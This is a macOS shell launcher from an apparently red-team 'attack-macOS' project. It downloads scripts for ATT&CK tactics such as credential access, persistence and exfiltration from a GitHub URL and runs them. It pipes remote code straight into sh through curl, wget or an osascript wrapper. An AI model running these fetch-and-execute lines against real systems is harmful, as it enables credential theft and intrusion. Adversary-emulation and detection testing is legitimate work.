# Name: asf.sh
# Platform: macOS
# Author: @darmado | x.com/darmad0
# Date: 2023-10-06
# Version: 1.2
# Last Modified: 2024-06-28
# Created: 2023-09-30
# License: Apache 2.0
# Repository: https://github.com/darmado/attack-macOS
# Description: Tool to fetch and execute scripts from the attack-macOS repository
# Dependencies: curl, wget, osascript (optional)

# Description:
# This tool fetches and executes scripts from the attack-macOS repository.
# with curl, wget, and osascript.

# URL template for fetching scripts from GitHub
GIT_URL="https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/{tactic}/{ttp}"

# Function to display help
display_help() {
    echo "Usage: asf.sh --<method> tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo "       asf.sh --local tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo
    echo "Methods:"
    echo "  --curl                 Use curl to download the script."
    echo "  --wget                 Use wget to download the script."
    echo "  --osascript            Use AppleScript to download the script."
    echo "  --local                Execute the script locally."
    echo
    echo "TTP arguments are unique and will not be listed here."
    echo "To find the specific arguments for each TTP, check the script documentation or the script itself."
    echo
    echo "Tactics:"
    echo "  - reconnaissance"
    echo "  - resource_development"
    echo "  - initial_access"
    echo "  - execution"
    echo "  - persistence"
    echo "  - privilege_escalation"
    echo "  - defense_evasion"
    echo "  - credential_access"
    echo "  - discovery"
    echo "  - lateral_movement"
    echo "  - collection"
    echo "  - command_and_control"
    echo "  - exfiltration"
    echo "  - impact"
    echo
    echo "Examples:"
    echo "  ./asf.sh --curl tactic=credential_access ttp=accounts --args=--help"
    echo "  ./asf.sh --wget tactic=discovery ttp=accounts --args='--verbose --log'"
    echo "  ./asf.sh --osascript tactic=initial_access ttp=accounts --args='--enable'"
    echo "  ./asf.sh --local tactic=execution ttp=run_script --args='-s'"
}

# Function to execute locally
execute_local() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    local LOCAL_PATH="./ttp/$tactic/$ttp"

    if [ -f "$LOCAL_PATH" ]; then
        echo "Executing local script: $LOCAL_PATH -- $args"
        sh "$LOCAL_PATH" $args  
    else
        echo "Error: Script not found at $LOCAL_PATH"
        exit 1
    fi
}

# Function to execute using curl
execute_curl() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    # Replace placeholders in URL with actual values
    local url="${GIT_URL/\{tactic\}/$tactic}"
    url="${url/\{ttp\}/$ttp}"
    echo "Executing with curl: $url -- $args"
    # Download and execute the script in a single line
    curl -sSL "$url" | sh -s -- $args
}

# Function to execute using wget
execute_wget() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    # Replace placeholders in URL with actual values
    local url="${GIT_URL/\{tactic\}/$tactic}"
    url="${url/\{ttp\}/$ttp}"
    echo "Executing with wget: $url -- $args"
    # Download and execute the script in a single line
    wget -qO- "$url" | sh -s -- $args
}

# Function to execute using osascript
execute_osascript() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    # Replace placeholders in URL with actual values
    local url="${GIT_URL/\{tactic\}/$tactic}"
    url="${url/\{ttp\}/$ttp}"
    echo "Executing with osascript: $url -- $args"
    # Use AppleScript to download and execute the script
    osascript -e "do shell script \"curl -sSL '$url' | sh -s -- $args\""
}

# Main function to parse arguments and call the appropriate function
main() {
    local method="$1"
    local tactic="$2"
    local ttp="$3"
    local args="$4"

    if [ "$method" == "--local" ]; then
        execute_local "$tactic" "$ttp" "$args"
    else
        case "$method" in
            --curl)
                execute_curl "$tactic" "$ttp" "$args"
                ;;
            --wget)
                execute_wget "$tactic" "$ttp" "$args"
                ;;
            --osascript)
                execute_osascript "$tactic" "$ttp" "$args"
                ;;
            *)
                echo "Unsupported method: $method"
                exit 1
                ;;
        esac
    fi
}

# Display help if --help is the only argument
if [ "$#" -eq 1 ] && [[ "$1" == "--help" ]]; then
    display_help
    exit 0
fi

# Check if the correct number of arguments is provided
if [ "$#" -lt 4 ]; then
    echo "Usage: $0 --<method> tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo "       $0 --local tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    exit 1
fi

# Parse command line arguments
method="$1"
tactic=$(echo "$2" | cut -d'=' -f2)
ttp=$(echo "$3" | cut -d'=' -f2)
args=$(echo "$4" | cut -d'=' -f2)

# Call the main function with parsed arguments
main "$method" "$tactic" "$ttp" "$args"